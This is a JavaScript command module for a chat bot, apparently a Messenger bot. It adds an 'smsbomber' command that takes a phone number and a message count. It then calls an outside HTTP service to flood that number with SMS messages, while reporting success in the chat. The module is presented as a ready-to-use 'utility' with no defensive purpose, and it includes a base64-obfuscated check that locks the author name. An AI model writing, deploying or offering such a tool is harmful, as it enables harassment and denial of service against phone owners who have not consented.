const axios = require("axios");

module.exports = {
  config: {
    name: "smsbomber",
    aliases: ["smsbomb"],
    author: "Mahi--",
    version: "1.0",
    cooldowns: 30,
    role: 0,
    shortDescription: "Send multiple SMS to a specified number.",
    longDescription: "Use the SMS Bomber API to send multiple SMS messages to a specified number.",
    category: "utility",
    guide: "{p}smsbomber <number> <amount>"
  },
  onStart: async function ({ message, args, api, event }) {
    // Ashen gaesemx kori 
    const checkAuthor = Buffer.from('TWFoaS0t', 'base64').toString('utf8');
    if (this.config.author !== checkAuthor) {
      return api.sendMessage("You are not authorized to change the author name.", event.threadID, event.messageID);
    }

    const [number, amount] = args;
    if (!number || !amount) {
      return api.sendMessage("❌ | Please provide a phone number and the amount of messages to send.\nExample: {p}smsbomber <number> <amount>", event.threadID);
    }

    // Notify the user that the request is being processed
    api.sendMessage("⏳ | Processing your request...", event.threadID, event.messageID);

    try {
      // Make the API call
      const apiUrl = `http://pnode3.danbot.host:5141/sms?number=${number}&amount=${amount}`;
      const response = await axios.get(apiUrl);

      // Check the response status
      if (response.status === 200) {
        api.sendMessage(`✅ | Successfully sent ${amount} SMS to ${number}.`, event.threadID);
      } else {
        api.sendMessage("❌ | Failed to send SMS. Please try again later.", event.threadID);
      }
    } catch (error) {
      console.error("Error:", error);
      api.sendMessage("❌ | An error occurred. Please try again later.", event.threadID);
    }
  }
};
